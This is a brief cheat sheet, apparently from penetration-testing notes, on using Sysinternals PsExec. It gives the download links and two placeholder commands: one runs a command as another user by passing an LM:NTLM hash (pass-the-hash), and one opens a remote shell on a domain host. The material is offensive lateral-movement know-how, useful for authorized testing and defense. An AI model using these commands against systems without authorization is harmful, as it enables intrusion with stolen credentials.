### Source
https://live.sysinternals.com/PsExec.exe  
https://live.sysinternals.com/PsExec64.exe  

### Run command as another user using a password or hash
```
psexec.exe -accepteula -u <user> -p <lm>:<ntlm> <command>
```

### Open remote shell
```
psexec.exe -accepteula -u <domain>\<user> -p <password> \\<rhost>
```

